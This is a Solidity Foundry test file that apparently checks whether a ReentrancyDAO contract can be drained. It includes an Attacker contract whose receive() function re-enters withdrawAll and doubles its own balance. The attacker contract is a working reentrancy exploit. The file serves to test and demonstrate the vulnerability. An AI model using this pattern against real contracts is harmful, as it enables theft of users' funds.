// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/reentrancy_dao.sol";

contract ReentrancyDaoTest is Test {
    ReentrancyDAO public dao;
    Attacker public attacker;
    uint256 public constant ATTACKER_DEPOSIT = 1 ether;
    uint256 public constant TEST_DEPOSIT = 1 ether;

    function setUp() public {
        // Deploy contracts
        dao = new ReentrancyDAO();
        attacker = new Attacker(dao);

        // Fund the accounts directly
        vm.deal(address(attacker), ATTACKER_DEPOSIT);
        deal(address(this), TEST_DEPOSIT); // Fund test contract for deposit

        // Make deposits - test contract deposits normally
        dao.deposit{value: TEST_DEPOSIT}();    
        // Attacker deposits using its own funds
        vm.prank(address(attacker));
        attacker.depositToDao();

        // Verify initial state
        assertEq(dao.getContractBalance(), TEST_DEPOSIT + ATTACKER_DEPOSIT);
        assertEq(dao.getUserCredit(address(attacker)), ATTACKER_DEPOSIT);
    }

    function testReentrantWithdraw() public {
        console2.log("--- BEFORE-Trigger State ---");
        // Capture initial state
        uint256 contractBalanceBefore = dao.getContractBalance();
        uint256 attackerCreditBefore = dao.getUserCredit(address(attacker));
        uint256 attackerBalanceBefore = address(attacker).balance;

        console2.log("Contract ETH balance: %s", contractBalanceBefore);
        console2.log("Attacker credit: %s", attackerCreditBefore);
        console2.log("Attacker ETH balance: %s", attackerBalanceBefore);

        console2.log("--- Trigger Attack ---");
        // Execute attack
        attacker.attack();
        
        console2.log("--- AFTER-Trigger State ---");
        // Capture post-attack state
        uint256 contractBalanceAfter = dao.getContractBalance();
        uint256 attackerCreditAfter = dao.getUserCredit(address(attacker));
        uint256 attackerBalanceAfter = address(attacker).balance;
        
        console2.log("Contract ETH balance: %s", contractBalanceAfter);
        console2.log("Attacker credit: %s", attackerCreditAfter);
        console2.log("Attacker ETH balance: %s", attackerBalanceAfter);

        // Determine vulnerability existence
        bool contractDrained = (contractBalanceAfter == 0);
        bool creditZero = (attackerCreditAfter == 0);
        bool doubleWithdraw = (attackerBalanceAfter == 2 * ATTACKER_DEPOSIT);
        bool vulnerabilityExists = contractDrained && creditZero && doubleWithdraw;

        // Final verdict
        if (vulnerabilityExists) {
            console2.log("Vulnerability Exists: Contract drained and attacker balance doubled");
        } else {
            console2.log("Vulnerability not Exist: State not changed as expected");
        }
    }
}

contract Attacker {
    ReentrancyDAO public dao;
    bool private reentrancyGuard;

    constructor(ReentrancyDAO _dao) {
        dao = _dao;
    }

    function depositToDao() public payable {
        dao.deposit{value: address(this).balance}();
    }

    function attack() public {
        // Initiate withdrawal to trigger reentrancy
        dao.withdrawAll();
    }

    receive() external payable {
        // Re-enter during ETH transfer (if not already in reentrancy)
        if (!reentrancyGuard) {
            reentrancyGuard = true;
            dao.withdrawAll();
        }
    }
}